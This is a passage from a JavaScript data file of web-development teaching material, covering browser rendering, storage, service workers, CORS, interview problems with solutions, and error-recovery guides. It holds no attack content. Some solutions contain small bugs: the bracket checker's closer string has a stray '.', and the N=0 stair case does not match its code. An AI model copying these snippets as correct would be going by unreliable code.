        'Use async or defer on scripts to avoid blocking',
        'Place scripts at end of body or in head with defer',
        'Use <link rel="preload"> for critical resources',
        'Inline critical CSS for fastest first paint',
      ],
      example: '<!-- BAD: blocks parser -->\n<script src="big.js"></script>\n\n<!-- GOOD: doesn\'t block, loads when ready -->\n<script src="big.js" async></script>\n\n<!-- GOOD: doesn\'t block, runs after DOM ready -->\n<script src="big.js" defer></script>',
      a11yImpact: 'Slow parsing delays first contentful paint, affecting users with slow connections + cognitive disabilities most.',
    },
    {
      topic: 'CSSOM (CSS Object Model)',
      summary: 'CSS is parsed into CSSOM, paired with DOM to form Render Tree. Together they determine how page renders.',
      stages: [
        '1. CSS bytes → characters → tokens → nodes',
        '2. CSSOM tree built (similar to DOM)',
        '3. CSSOM combined with DOM = Render Tree',
        '4. Layout (size + position) calculated',
        '5. Paint (pixels drawn to screen)',
      ],
      keyConcepts: {
        'specificity': 'CSS rules apply based on specificity. id > class > tag.',
        'cascading': 'Multiple rules can apply. Order matters within same specificity.',
        'inheritance': 'Some properties inherit (color, font); others don\'t (border).',
        'render-blocking': 'CSS blocks render (page won\'t paint until CSS is parsed).',
      },
      whatYouCanControl: [
        'Use <link rel="preload"> for critical CSS',
        'Inline critical above-the-fold CSS',
        'Use media queries to non-block non-critical CSS',
        'Minimize unused CSS (PurgeCSS, etc.)',
      ],
      example: '<!-- Critical CSS inline -->\n<style>\n  body { font-family: sans-serif; }\n</style>\n\n<!-- Non-critical CSS loaded async -->\n<link rel="stylesheet" href="non-critical.css" media="print" onload="this.media=\'all\'">',
      a11yImpact: 'Slow CSS delays paint. Users see blank screen longer. Use FOUT (Flash of Unstyled Text) to show content first.',
    },
    {
      topic: 'JavaScript execution',
      summary: 'JS runs in a single thread. The event loop coordinates async operations.',
      stages: [
        '1. JS parser tokenizes + builds AST',
        '2. Compile to bytecode',
        '3. Execute on call stack',
        '4. Async ops (setTimeout, fetch) registered with browser APIs',
        '5. Callbacks queued when async completes',
        '6. Event loop pulls callbacks when stack is empty',
      ],
      keyConcepts: {
        'callStack': 'Where synchronous functions run. Last-in-first-out.',
        'callbackQueue': 'Where callbacks wait (setTimeout, etc.)',
        'microtaskQueue': 'Where promise callbacks wait (priority over regular callbacks)',
        'eventLoop': 'Constantly checks: stack empty? Move from queue.',
      },
      whatYouCanControl: [
        'Don\'t block the main thread (heavy computation)',
        'Use Web Workers for parallel work',
        'Use requestAnimationFrame for animations',
        'Use Promise.all for parallel async',
      ],
      example: 'console.log(1); // Sync: runs first\nsetTimeout(() => console.log(2), 0); // Async\nPromise.resolve().then(() => console.log(3));\nconsole.log(4); // Sync\n\n// Output: 1, 4, 3, 2\n// Sync runs first, then microtasks (promises), then macrotasks (setTimeout)',
      a11yImpact: 'Blocking JS halts everything — keyboard input, screen readers, animations.',
    },
    {
      topic: 'Layout (reflow) + Paint (repaint)',
      summary: 'Layout calculates size + position. Paint draws pixels. Both are expensive.',
      stages: [
        'Layout (reflow): geometry calculation. Triggered by: size changes, content changes, font load, etc.',
        'Paint: pixels drawn. Triggered by: color, background, border, opacity changes.',
        'Composite: layers combined. Triggered by: transform, opacity (on its own layer).',
      ],
      keyConcepts: {
        'reflow': 'Recalculating geometry. Expensive — affects entire DOM tree.',
        'repaint': 'Re-drawing pixels. Less expensive than reflow.',
        'compositing': 'Combining layers. Cheapest. transform + opacity are compositor-only.',
      },
      whatYouCanControl: [
        'Animate transform + opacity (compositor-only, fast)',
        'Avoid animating width, height, top, left (forces reflow)',
        'Batch DOM reads + writes (avoid layout thrashing)',
        'Use will-change for elements that will animate',
      ],
      example: '/* GOOD: transform-based animation (60fps possible) */\n.move {\n  transition: transform 0.3s;\n}\n.move:hover {\n  transform: translateX(100px);\n}\n\n/* BAD: triggers reflow on every frame */\n.move {\n  transition: left 0.3s;\n}\n.move:hover {\n  left: 100px;\n}',
      a11yImpact: 'Janky animations are uncomfortable to watch. Affects users with vestibular disorders especially.',
    },
    {
      topic: 'Cache (HTTP + browser)',
      summary: 'Browsers cache resources to avoid re-downloading. Multiple cache layers.',
      stages: [
        '1. Memory cache: in RAM, fastest',
        '2. Disk cache: on disk, fast',
        '3. Service Worker cache: programmable cache',
        '4. HTTP cache: server-provided cache rules',
      ],
      keyConcepts: {
        'cacheHeaders': 'Cache-Control, Expires, ETag from server tell browser what to cache.',
        'busting': 'Hash-named files for forced reload after changes.',
        'serviceWorker': 'Programmatic cache for offline + advanced caching.',
      },
      whatYouCanControl: [
        'Set Cache-Control headers correctly',
        'Use hashed filenames (e.g., bundle.abc123.js)',
        'Use Service Workers for offline-first',
        'Use CDN for static assets',
      ],
      example: '/* HTTP headers (server-side) */\n// Cache static assets aggressively:\nCache-Control: public, max-age=31536000, immutable\n\n// Cache HTML with revalidation:\nCache-Control: no-cache\n\n/* Hashed filename for cache busting */\n<script src="/bundle.abc123def456.js"></script>',
      a11yImpact: 'Caching speeds up page loads, helping users with slow connections or vision-impaired users who depend on consistent timing.',
    },
    {
      topic: 'Cookies + localStorage + sessionStorage + IndexedDB',
      summary: 'Different ways to store data on the client.',
      stages: [
        'Cookies: server can set, browser sends with every request. Size limit ~4KB.',
        'localStorage: client-only persistent. ~5MB.',
        'sessionStorage: client-only, tab-scoped. ~5MB.',
        'IndexedDB: client-only, structured. Hundreds of MB+.',
        'Cache API: for service workers, store HTTP responses.',
      ],
      keyConcepts: {
        'whichToUse': 'Cookies for auth tokens (httpOnly). localStorage for user preferences. IndexedDB for large/structured data. Cache API for offline.',
        'security': 'XSS can steal localStorage. httpOnly cookies are safer for auth.',
        'limits': 'Browsers have storage quotas.',
      },
      whatYouCanControl: [
        'Don\'t store sensitive data in localStorage',
        'Use httpOnly + Secure on auth cookies',
        'Use sessionStorage for tab-local state',
        'Use IndexedDB for offline apps',
      ],
      example: '// Cookies (browser-readable):\ndocument.cookie = "username=alice; max-age=3600; SameSite=Strict";\n\n// localStorage (persistent):\nlocalStorage.setItem("theme", "dark");\nconst theme = localStorage.getItem("theme");\n\n// sessionStorage (tab-scoped):\nsessionStorage.setItem("draft", text);\n\n// IndexedDB (structured, async):\nconst request = indexedDB.open("myDB", 1);\nrequest.onsuccess = function(event) {\n  const db = event.target.result;\n  // ...\n};',
      a11yImpact: 'Persistent settings (theme, preferences) help users who configure once + expect consistency.',
    },
    {
      topic: 'Service Workers + Progressive Web Apps',
      summary: 'Service workers are background scripts that proxy network requests. Foundation of offline-capable PWAs.',
      stages: [
        '1. Register service worker from your page',
        '2. SW installs + activates',
        '3. SW intercepts fetch events',
        '4. SW can serve from cache or network',
        '5. SW can sync data when online',
      ],
      keyConcepts: {
        'lifecycle': 'install → activate → fetch (intercept)',
        'scope': 'SW only controls pages under its scope',
        'updates': 'New SW versions don\'t auto-activate (until pages close)',
        'pwa': 'Progressive Web App = manifest + service worker + offline capability',
      },
      whatYouCanControl: [
        'Cache-first or network-first strategies',
        'Stale-while-revalidate (serve cached, update in background)',
        'Background sync for offline',
        'Push notifications',
      ],
      example: '// Register:\nnavigator.serviceWorker.register("/sw.js");\n\n// In sw.js:\nself.addEventListener("install", event => {\n  event.waitUntil(\n    caches.open("v1").then(cache => cache.addAll([\n      "/", "/style.css", "/app.js"\n    ]))\n  );\n});\n\nself.addEventListener("fetch", event => {\n  event.respondWith(\n    caches.match(event.request).then(cached => {\n      return cached || fetch(event.request);\n    })\n  );\n});',
      a11yImpact: 'Offline support helps users in low-connectivity areas + users who can\'t always be online (rural, refugees, disabled with limited internet).',
    },
    {
      topic: 'Same-Origin Policy + CORS',
      summary: 'Browser security: pages from different origins can\'t access each other\'s data.',
      stages: [
        '1. Page tries to fetch from different origin',
        '2. Browser checks Same-Origin Policy',
        '3. If different + no CORS headers, request blocked',
        '4. Server can set Access-Control-Allow-Origin to allow',
      ],
      keyConcepts: {
        'origin': 'Protocol + host + port. https://example.com:443 is one origin.',
        'preflight': 'For non-simple requests, browser sends OPTIONS request first.',
        'credentials': 'Cross-origin cookies are blocked by default.',
      },
      whatYouCanControl: [
        'Server-side: set CORS headers for legitimate origins',
        'Use server proxy to bypass CORS in dev',
        'Don\'t expose CORS too permissively',
      ],
      example: '// Server side (Express):\napp.use((req, res, next) => {\n  res.setHeader("Access-Control-Allow-Origin", "https://yoursite.com");\n  res.setHeader("Access-Control-Allow-Methods", "GET, POST");\n  next();\n});\n\n// Client-side: include credentials\nfetch("https://api.example.com", {\n  credentials: "include"\n});',
      a11yImpact: 'No direct accessibility impact, but security failures can lead to phishing/XSS that affects all users.',
    },
    {
      topic: 'Web APIs you should know',
      summary: 'Browsers expose many APIs beyond DOM. Selected highlights.',
      stages: [],
      keyConcepts: {
        'fetch': 'Modern HTTP requests',
        'WebSocket': 'Bi-directional real-time communication',
        'WebRTC': 'Peer-to-peer video/audio + data',
        'Geolocation': 'User location (with permission)',
        'Notifications': 'OS-level notifications',
        'IntersectionObserver': 'Detect when elements enter/exit viewport',
        'MutationObserver': 'Watch DOM changes',
        'ResizeObserver': 'Watch element size changes',
        'IndexedDB': 'Structured client-side storage',
        'WebWorker': 'Background JavaScript thread',
        'AudioContext': 'Synthesize + process audio',
        'Canvas + WebGL': 'Drawing surface (2D + 3D)',
        'speechSynthesis': 'Text-to-speech',
        'SpeechRecognition': 'Voice input',
        'navigator.share': 'Native share menu (mobile)',
        'Permissions API': 'Check permission state',
        'Battery Status': 'Mobile battery info',
        'Vibration': 'Mobile haptic',
      },
      whatYouCanControl: [
        'Use APIs progressively (check if available before using)',
        'Handle permission denials gracefully',
        'Don\'t require APIs that may not exist',
        'Provide fallbacks',
      ],
      example: '// Progressive use of Notifications:\nif ("Notification" in window) {\n  if (Notification.permission === "granted") {\n    new Notification("Hello!");\n  } else if (Notification.permission !== "denied") {\n    Notification.requestPermission().then(perm => {\n      if (perm === "granted") new Notification("Hello!");\n    });\n  }\n}',
      a11yImpact: 'speechSynthesis + SpeechRecognition + Permissions API are particularly relevant for users with disabilities.',
    },
    {
      topic: 'Browser DevTools (developer tools)',
      summary: 'Every browser has dev tools. Master them.',
      stages: [],
      keyConcepts: {
        'Elements': 'Inspect HTML + CSS. Edit in real-time.',
        'Console': 'JavaScript REPL. Log output. Errors.',
        'Network': 'Watch HTTP requests. Throttle network. Replay.',
        'Performance': 'Profile JS + rendering. Find slowdowns.',
        'Application': 'Inspect cookies, localStorage, IndexedDB.',
        'Lighthouse': 'Automated accessibility + performance audits.',
        'Memory': 'Find memory leaks.',
        'Sources': 'Set breakpoints. Debug code.',
        'Coverage': 'Find unused CSS + JS.',
      },
      whatYouCanControl: [
        'Use breakpoints (more powerful than console.log)',
        'Throttle network in dev (simulate slow connections)',
        'Test in incognito (no extensions)',
        'Use multiple browsers (test compatibility)',
      ],
      example: '// In code: trigger breakpoint\nconsole.log("Loading...");\ndebugger; // Code pauses here when DevTools open\n\n// In console: query DOM\n$("#myBtn") // Like document.querySelector\n$$("p") // Like document.querySelectorAll\n$_ // Last expression result',
      a11yImpact: 'Lighthouse + axe + WAVE all run in DevTools. Use them.',
    },
  ];

  // ─── Major coding interview problems (with full solutions) ───────
  var INTERVIEW_PROBLEMS = [
    {
      problem: 'Reverse a String',
      difficulty: 'Easy',
      domains: ['Strings', 'Arrays'],
      description: 'Given a string, return it reversed.',
      examples: ['"hello" → "olleh"', '"" → ""', '"a" → "a"'],
      naiveSolution: 'function reverse(str) {\n  return str.split("").reverse().join("");\n}',
      naiveAnalysis: 'Time: O(n). Space: O(n) for the array.',
      optimalSolution: '// Same approach is optimal for this problem.\n// Using a loop:\nfunction reverse(str) {\n  let result = "";\n  for (let i = str.length - 1; i >= 0; i--) {\n    result += str[i];\n  }\n  return result;\n}',
      optimalAnalysis: 'Time: O(n). Space: O(n).',
      edgeCases: ['Empty string', 'Single character', 'Unicode (emoji, surrogates)'],
      followUp: 'How would you handle Unicode characters? (Hint: Array.from for surrogate pair handling.)',
      relatedConcepts: ['Array methods', 'Two-pointer technique'],
      whyAsked: 'Tests string manipulation, array methods, basic algorithm.',
    },
    {
      problem: 'Find Two Numbers That Sum to Target',
      difficulty: 'Easy',
      domains: ['Arrays', 'Hash maps'],
      description: 'Given array of integers + target, return indices of two numbers that sum to target.',
      examples: ['[2,7,11,15], 9 → [0,1] (since 2+7=9)', '[3,2,4], 6 → [1,2]', '[3,3], 6 → [0,1]'],
      naiveSolution: 'function twoSum(arr, target) {\n  for (let i = 0; i < arr.length; i++) {\n    for (let j = i + 1; j < arr.length; j++) {\n      if (arr[i] + arr[j] === target) {\n        return [i, j];\n      }\n    }\n  }\n  return null;\n}',
      naiveAnalysis: 'Time: O(n²). Space: O(1).',
      optimalSolution: 'function twoSum(arr, target) {\n  const seen = {};\n  for (let i = 0; i < arr.length; i++) {\n    const need = target - arr[i];\n    if (seen[need] !== undefined) {\n      return [seen[need], i];\n    }\n    seen[arr[i]] = i;\n  }\n  return null;\n}',
      optimalAnalysis: 'Time: O(n). Space: O(n) for hash map.',
      edgeCases: ['Same number twice', 'No solution', 'Negative numbers', 'Empty array'],
      followUp: 'What if there are multiple pairs? Return all? What if duplicates aren\'t allowed?',
      relatedConcepts: ['Hash maps', 'Time-space tradeoff'],
      whyAsked: 'Classic problem. Tests hash map understanding + O(n²) → O(n) optimization.',
    },
    {
      problem: 'Check if String is Palindrome',
      difficulty: 'Easy',
      domains: ['Strings'],
      description: 'A palindrome reads the same forward + backward. Check if a string is one.',
      examples: ['"racecar" → true', '"hello" → false', '"A man, a plan, a canal: Panama" → true (ignoring case + non-alpha)'],
      naiveSolution: 'function isPalindrome(str) {\n  return str === str.split("").reverse().join("");\n}',
      naiveAnalysis: 'Time: O(n). Space: O(n).',
      optimalSolution: 'function isPalindrome(str) {\n  let left = 0, right = str.length - 1;\n  while (left < right) {\n    if (str[left] !== str[right]) return false;\n    left++;\n    right--;\n  }\n  return true;\n}',
      optimalAnalysis: 'Time: O(n). Space: O(1).',
      edgeCases: ['Empty string', 'Single character', 'Case-insensitive', 'Non-alphanumeric chars'],
      followUp: 'Make it ignore case + non-alpha. Make it Unicode-aware.',
      relatedConcepts: ['Two-pointer technique', 'String iteration'],
      whyAsked: 'Tests two-pointer technique. Classic warmup.',
    },
    {
      problem: 'Find Maximum Subarray Sum (Kadane\'s Algorithm)',
      difficulty: 'Medium',
      domains: ['Arrays', 'Dynamic Programming'],
      description: 'Given array of integers (positive + negative), find max sum of contiguous subarray.',
      examples: ['[-2,1,-3,4,-1,2,1,-5,4] → 6 (sum of [4,-1,2,1])', '[1] → 1', '[-1,-2,-3] → -1'],
      naiveSolution: '// Try all subarrays: O(n³)\nfunction maxSubarray(arr) {\n  let max = -Infinity;\n  for (let i = 0; i < arr.length; i++) {\n    for (let j = i; j < arr.length; j++) {\n      let sum = 0;\n      for (let k = i; k <= j; k++) sum += arr[k];\n      max = Math.max(max, sum);\n    }\n  }\n  return max;\n}',
      naiveAnalysis: 'Time: O(n³). Space: O(1).',
      optimalSolution: '// Kadane\'s algorithm: O(n)\nfunction maxSubarray(arr) {\n  let maxEndingHere = arr[0];\n  let maxSoFar = arr[0];\n  for (let i = 1; i < arr.length; i++) {\n    maxEndingHere = Math.max(arr[i], maxEndingHere + arr[i]);\n    maxSoFar = Math.max(maxSoFar, maxEndingHere);\n  }\n  return maxSoFar;\n}',
      optimalAnalysis: 'Time: O(n). Space: O(1). One of the most elegant DP solutions.',
      edgeCases: ['All negative', 'All positive', 'Empty array (handle separately)'],
      followUp: 'Find the actual subarray (not just sum). Find max-sum non-contiguous subarray (different problem).',
      relatedConcepts: ['Dynamic programming', 'Running optimization'],
      whyAsked: 'Famous DP problem. Tests ability to find O(n³) → O(n) optimization.',
    },
    {
      problem: 'FizzBuzz',
      difficulty: 'Easy',
      domains: ['Strings', 'Numbers'],
      description: 'Print 1 to N. Multiples of 3 → "Fizz". Multiples of 5 → "Buzz". Multiples of both → "FizzBuzz".',
      examples: ['N=15 → 1, 2, Fizz, 4, Buzz, Fizz, 7, 8, Fizz, Buzz, 11, Fizz, 13, 14, FizzBuzz'],
      naiveSolution: 'function fizzBuzz(n) {\n  for (let i = 1; i <= n; i++) {\n    if (i % 3 === 0 && i % 5 === 0) console.log("FizzBuzz");\n    else if (i % 3 === 0) console.log("Fizz");\n    else if (i % 5 === 0) console.log("Buzz");\n    else console.log(i);\n  }\n}',
      naiveAnalysis: 'Time: O(n). Space: O(1).',
      optimalSolution: '// Slightly cleaner:\nfunction fizzBuzz(n) {\n  for (let i = 1; i <= n; i++) {\n    let out = "";\n    if (i % 3 === 0) out += "Fizz";\n    if (i % 5 === 0) out += "Buzz";\n    console.log(out || i);\n  }\n}',
      optimalAnalysis: 'Time: O(n). Space: O(1).',
      edgeCases: ['N = 0', 'N = 1', 'Large N'],
      followUp: 'What if multiples were dynamic? Generalize.',
      relatedConcepts: ['Modulo operator', 'Iteration', 'Conditionals'],
      whyAsked: 'Famous filter problem. Reveals if candidate can implement basic logic.',
    },
    {
      problem: 'Valid Parentheses',
      difficulty: 'Easy',
      domains: ['Strings', 'Stacks'],
      description: 'Given a string with brackets, check if they\'re balanced.',
      examples: ['"()" → true', '"()[]{}" → true', '"(]" → false', '"([)]" → false', '"{[]}" → true'],
      naiveSolution: '// (Same as optimal — stack is the right approach)',
      naiveAnalysis: 'N/A',
      optimalSolution: 'function isValid(str) {\n  const stack = [];\n  const pairs = { ")": "(", "]": "[", "}": "{" };\n  for (const ch of str) {\n    if ("([{".includes(ch)) {\n      stack.push(ch);\n    } else if (")]}.".includes(ch)) {\n      if (stack.pop() !== pairs[ch]) return false;\n    }\n  }\n  return stack.length === 0;\n}',
      optimalAnalysis: 'Time: O(n). Space: O(n) for stack.',
      edgeCases: ['Empty string (valid)', 'Single bracket (invalid)', 'Many mixed brackets', 'Other characters interspersed'],
      followUp: 'Allow other characters (non-bracket)? Generalize to arbitrary pairings?',
      relatedConcepts: ['Stack data structure', 'String iteration'],
      whyAsked: 'Classic stack problem. Tests understanding of when to use stacks.',
    },
    {
      problem: 'Reverse a Linked List',
      difficulty: 'Easy/Medium',
      domains: ['Linked Lists'],
      description: 'Given head of singly linked list, reverse it.',
      examples: ['1→2→3→4 → 4→3→2→1'],
      naiveSolution: '// Recursive (also works):\nfunction reverse(head) {\n  if (!head || !head.next) return head;\n  const newHead = reverse(head.next);\n  head.next.next = head;\n  head.next = null;\n  return newHead;\n}',
      naiveAnalysis: 'Time: O(n). Space: O(n) for recursion stack.',
      optimalSolution: '// Iterative:\nfunction reverse(head) {\n  let prev = null;\n  let current = head;\n  while (current) {\n    const next = current.next;\n    current.next = prev;\n    prev = current;\n    current = next;\n  }\n  return prev;\n}',
      optimalAnalysis: 'Time: O(n). Space: O(1).',
      edgeCases: ['Empty list', 'Single node', 'Two nodes'],
      followUp: 'Reverse only part of list. Doubly linked list.',
      relatedConcepts: ['Linked lists', 'Pointer manipulation'],
      whyAsked: 'Tests pointer manipulation + linked list comfort. Common.',
    },
    {
      problem: 'Find the Missing Number',
      difficulty: 'Easy',
      domains: ['Arrays', 'Math'],
      description: 'Array contains numbers 0 to N with one missing. Find it.',
      examples: ['[3,0,1] → 2', '[0,1] → 2', '[9,6,4,2,3,5,7,0,1] → 8'],
      naiveSolution: '// Sort + look:\nfunction missing(arr) {\n  arr.sort((a, b) => a - b);\n  for (let i = 0; i < arr.length; i++) {\n    if (arr[i] !== i) return i;\n  }\n  return arr.length;\n}',
      naiveAnalysis: 'Time: O(n log n) due to sort. Space: O(1) if in-place.',
      optimalSolution: '// Math: expected sum - actual sum\nfunction missing(arr) {\n  const n = arr.length;\n  const expected = n * (n + 1) / 2;\n  const actual = arr.reduce((a, b) => a + b, 0);\n  return expected - actual;\n}\n\n// Or XOR (no overflow risk):\nfunction missing2(arr) {\n  let result = arr.length;\n  for (let i = 0; i < arr.length; i++) {\n    result ^= i ^ arr[i];\n  }\n  return result;\n}',
      optimalAnalysis: 'Time: O(n). Space: O(1).',
      edgeCases: ['Empty array (missing is 0)', 'All numbers (overflow if very large)', 'Negative numbers (problem assumes non-negative)'],
      followUp: 'What if 2 numbers are missing? Handle very large arrays (XOR avoids overflow).',
      relatedConcepts: ['Math properties', 'XOR', 'Sum formula'],
      whyAsked: 'Tests both classic + math-based thinking.',
    },
    {
      problem: 'Merge Two Sorted Lists',
      difficulty: 'Easy',
      domains: ['Linked Lists', 'Arrays'],
      description: 'Given two sorted lists, merge into one sorted list.',
      examples: ['[1,2,4] + [1,3,4] → [1,1,2,3,4,4]'],
      naiveSolution: '// Concatenate + sort: O((n+m) log(n+m))\nfunction merge(a, b) {\n  return [...a, ...b].sort((x, y) => x - y);\n}',
      naiveAnalysis: 'Time: O((n+m) log(n+m)). Space: O(n+m).',
      optimalSolution: '// Two pointers: O(n+m)\nfunction merge(a, b) {\n  const result = [];\n  let i = 0, j = 0;\n  while (i < a.length && j < b.length) {\n    if (a[i] <= b[j]) result.push(a[i++]);\n    else result.push(b[j++]);\n  }\n  return [...result, ...a.slice(i), ...b.slice(j)];\n}',
      optimalAnalysis: 'Time: O(n+m). Space: O(n+m).',
      edgeCases: ['Empty arrays', 'One empty', 'Same lengths', 'Different lengths', 'Duplicates'],
      followUp: 'Merge k sorted lists (more complex — priority queue).',
      relatedConcepts: ['Two-pointer technique', 'Merging strategy'],
      whyAsked: 'Tests two-pointer technique + thinking about complexity.',
    },
    {
      problem: 'Climbing Stairs (Fibonacci)',
      difficulty: 'Easy/Medium',
      domains: ['Dynamic Programming', 'Math'],
      description: 'You can climb 1 or 2 stairs at a time. How many ways to climb N stairs?',
      examples: ['N=2 → 2 (1+1, 2)', 'N=3 → 3 (1+1+1, 1+2, 2+1)', 'N=5 → 8'],
      naiveSolution: '// Naive recursion: O(2^n)\nfunction climb(n) {\n  if (n <= 2) return n;\n  return climb(n - 1) + climb(n - 2);\n}',
      naiveAnalysis: 'Time: O(2^n). Space: O(n) call stack.',
      optimalSolution: '// Memoization or iteration: O(n)\nfunction climb(n) {\n  if (n <= 2) return n;\n  let prev1 = 1, prev2 = 2;\n  for (let i = 3; i <= n; i++) {\n    const current = prev1 + prev2;\n    prev1 = prev2;\n    prev2 = current;\n  }\n  return prev2;\n}',
      optimalAnalysis: 'Time: O(n). Space: O(1).',
      edgeCases: ['N = 0 (1 way)', 'N = 1 (1 way)', 'Large N (overflow with naive)'],
      followUp: 'What if you can climb 1, 2, or 3 stairs? Generalize.',
      relatedConcepts: ['Dynamic programming', 'Fibonacci', 'Memoization'],
      whyAsked: 'Tests recognizing Fibonacci-like pattern + DP optimization.',
    },
    {
      problem: 'Buy and Sell Stock',
      difficulty: 'Easy/Medium',
      domains: ['Arrays', 'Greedy'],
      description: 'Array of stock prices on each day. What\'s the max profit from buying once + selling once?',
      examples: ['[7,1,5,3,6,4] → 5 (buy at 1, sell at 6)', '[7,6,4,3,1] → 0 (no profit)'],
      naiveSolution: '// Naive: try all pairs O(n²)\nfunction maxProfit(prices) {\n  let max = 0;\n  for (let i = 0; i < prices.length; i++) {\n    for (let j = i + 1; j < prices.length; j++) {\n      max = Math.max(max, prices[j] - prices[i]);\n    }\n  }\n  return max;\n}',
      naiveAnalysis: 'Time: O(n²). Space: O(1).',
      optimalSolution: '// Single pass: O(n)\nfunction maxProfit(prices) {\n  let minPrice = Infinity;\n  let maxProfit = 0;\n  for (const price of prices) {\n    if (price < minPrice) minPrice = price;\n    else if (price - minPrice > maxProfit) maxProfit = price - minPrice;\n  }\n  return maxProfit;\n}',
      optimalAnalysis: 'Time: O(n). Space: O(1).',
      edgeCases: ['Empty array', 'Single price', 'Decreasing prices', 'All same'],
      followUp: 'Multiple buys + sells? Cooldown period?',
      relatedConcepts: ['Greedy algorithm', 'Single-pass optimization'],
      whyAsked: 'Tests recognition that complete state isn\'t needed — just min-so-far.',
    },
  ];

  // ─── Common errors + complete recovery guides ─────────────────────
  var ERROR_RECOVERY = [
    {
      error: 'Uncaught TypeError: Cannot read properties of undefined',
      severity: 'Critical',
      whatItMeans: 'You\'re trying to access a property or method on something that doesn\'t exist (undefined or null).',
      commonCauses: [
        'Function returned nothing where you expected an object',
        'Array indexing out of bounds',
        'Object key that doesn\'t exist',
        'Promise rejection that wasn\'t caught',
        'Data hasn\'t loaded yet',
      ],
      example: 'const user = getUser();\nconsole.log(user.name); // TypeError if user is undefined',
      diagnosis: [
        '1. Check the line number in the error',
        '2. Console.log the variable just before the error line',
        '3. Trace back to where it should have been set',
        '4. Verify the path is correct',
      ],
      fixes: [
        '// Optional chaining (modern):\nconsole.log(user?.name);',
        '// Null check:\nif (user) console.log(user.name);',
        '// Default value:\nconst { name = "Anonymous" } = user || {};\nconsole.log(name);',
        '// For async data:\nif (data && data.loaded) processData(data);',
      ],
      preventStrategy: 'Always validate that data exists before using it. Use TypeScript or JSDoc to catch at compile time.',
    },
    {
      error: 'Uncaught ReferenceError: X is not defined',
      severity: 'Critical',
      whatItMeans: 'Using a variable or function that doesn\'t exist in current scope.',
      commonCauses: [
        'Typo in variable name',
        'Variable in different scope (block, function)',
        'Declared with let/const after use (Temporal Dead Zone)',
        'Forgot to import/export module',
      ],
      example: 'console.log(myVar); // ReferenceError\nlet myVar = 5;',
      diagnosis: [
        '1. Check spelling',
        '2. Verify scope (where is variable declared?)',
        '3. Check if it should be declared in outer scope',
        '4. Check imports if module',
      ],
      fixes: [
        '// Declare first:\nlet myVar = 5;\nconsole.log(myVar);',
        '// Use typeof for "exists" check:\nif (typeof myVar !== "undefined") console.log(myVar);',
        '// Module: ensure import',
        '// Fix typo',
      ],
      preventStrategy: 'Use linter (ESLint). Use IDE that highlights undefined references.',
    },
    {
      error: 'Uncaught SyntaxError: Unexpected token',
      severity: 'Critical',
      whatItMeans: 'JavaScript can\'t parse your code.',
      commonCauses: [
        'Missing closing bracket, parenthesis, or quote',
        'Reserved word used as variable name',
        'Invalid character (smart quotes, em-dash) copied from word processor',
        'Using ES6+ in old browser without transpilation',
      ],
      example: 'function bad() {\n  console.log("hello"; // Missing )\n}',
      diagnosis: [
        '1. Check line + column in error message',
        '2. Look for unmatched brackets, quotes, parens',
        '3. Look for unusual characters copied from elsewhere',
        '4. Use a code editor with bracket matching',
      ],
      fixes: [
        '// Add missing punctuation',
        '// Reformat code (Prettier auto-fixes)',
        '// Replace smart quotes with regular quotes',
        '// Update browser or add Babel',
      ],
      preventStrategy: 'Use code editor (VS Code) with syntax highlighting + bracket matching.',
    },
    {
      error: 'CORS error: blocked by CORS policy',
      severity: 'High (blocks functionality)',
      whatItMeans: 'Browser blocked your request because the server didn\'t explicitly allow your origin.',
      commonCauses: [
        'Fetching from third-party API that doesn\'t allow CORS',
        'Backend not configured for cross-origin requests',
        'Localhost development against production API',
        'Missing or incorrect CORS headers from server',
      ],
      example: '// Trying to fetch from a different domain:\nfetch("https://api.example.com/data") // CORS blocked!',
      diagnosis: [
        '1. Check Network tab in dev tools',
        '2. Look for response headers — is Access-Control-Allow-Origin present?',
        '3. Check what your request origin is',
        '4. Is API CORS-enabled or no?',
      ],
      fixes: [
        '// Use CORS-enabled API (some have flags or alternate endpoints)',
        '// Proxy through your own server:\nconst data = await fetch("/api/proxy?url=...");',
        '// Use a CORS proxy (dev only): cors-anywhere.herokuapp.com',
        '// Server side: add CORS headers',
        '// On Express: app.use(cors())',
      ],
      preventStrategy: 'Plan API access early. Test on production-like setup. Use server-side fetching for sensitive APIs.',
    },
    {
      error: 'Maximum call stack size exceeded',
      severity: 'Critical',
      whatItMeans: 'Stack overflow — typically from infinite recursion.',
      commonCauses: [
        'Recursive function without base case',
        'Circular function references',
        'Recursive setState (in React)',
        'Mutual recursion (A calls B, B calls A)',
      ],
      example: 'function infinite(n) { return infinite(n + 1); } // No stop!',
      diagnosis: [
        '1. Find which function is recursing',
        '2. Look for base case (stopping condition)',
        '3. Trace recursive logic',
        '4. Check if state updates trigger re-renders that trigger updates',
      ],
      fixes: [
        '// Add base case:\nfunction count(n, max = 100) {\n  if (n >= max) return n;\n  return count(n + 1, max);\n}',
        '// Convert to iteration:\nlet n = 0;\nwhile (n < max) n++;\nreturn n;',
        '// In React: useEffect dependency array',
      ],
      preventStrategy: 'Always design recursion with explicit base case first. Use trampolining for deep recursion.',
    },
    {
      error: 'JSON.parse: unexpected token',
      severity: 'Medium',
      whatItMeans: 'String passed to JSON.parse isn\'t valid JSON.',
      commonCauses: [
        'Response is HTML (error page), not JSON',
        'Empty string',
        'String has single quotes instead of double',
        'JavaScript object literal (with unquoted keys)',
      ],
      example: 'const data = JSON.parse(response); // If response is HTML, throws',
      diagnosis: [
        '1. Console.log the response BEFORE parsing',
        '2. Check Network tab — what content-type?',
        '3. Try parsing a known-good JSON to isolate',
      ],
      fixes: [
        '// Wrap in try/catch:\ntry { const data = JSON.parse(text); }\ncatch (e) { console.error("Invalid JSON:", e); }',
        '// Check content-type first:\nif (response.headers.get("content-type")?.includes("json")) {\n  const data = await response.json();\n}',
        '// For object literals (server-side):\nUse JSON5 or hand-fix the string',
      ],
      preventStrategy: 'Always validate response before parsing. Check content-type. Handle errors gracefully.',
    },
    {
      error: 'Uncaught (in promise) Error',
      severity: 'High',
      whatItMeans: 'Promise rejected, and you didn\'t handle it with .catch() or try/catch.',
      commonCauses: [
        'Network error in fetch',
        'API returned 4xx or 5xx',
        'Async function throws',
        'Forgot .catch() on a chain',
      ],
      example: 'fetch("/api/data"); // No error handling!\n// If this fails, you get unhandled rejection',
      diagnosis: [
        '1. Find which promise rejected',
        '2. Check if you have .catch() or try/catch',
        '3. Verify the underlying request would succeed',
        '4. Look at network response status',
      ],
      fixes: [
        '// Use .catch():\nfetch("/api/data")\n  .then(r => r.json())\n  .catch(err => console.error(err));',
